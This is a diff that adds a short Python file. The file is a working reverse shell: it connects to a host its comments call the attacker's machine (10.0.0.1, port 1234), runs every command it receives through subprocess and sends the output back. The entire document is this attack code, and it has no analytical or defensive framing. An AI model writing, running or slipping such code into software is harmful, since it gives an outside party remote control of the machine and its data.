@@ -1,0 +1,23 @@
+import socket
+import subprocess
+
+# Attacker's IP and port
+attacker_ip = "10.0.0.1"
+attacker_port = 1234
+
+# Connect to the attacker's machine
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((attacker_ip, attacker_port))
+
+# Start an interactive shell
+while True:
+    command = s.recv(1024).decode()
+
+    if command.lower() == "exit":
+        break
+
+    # Execute the received command
+    output = subprocess.getoutput(command)
+    s.send(output.encode())
+
+s.close()
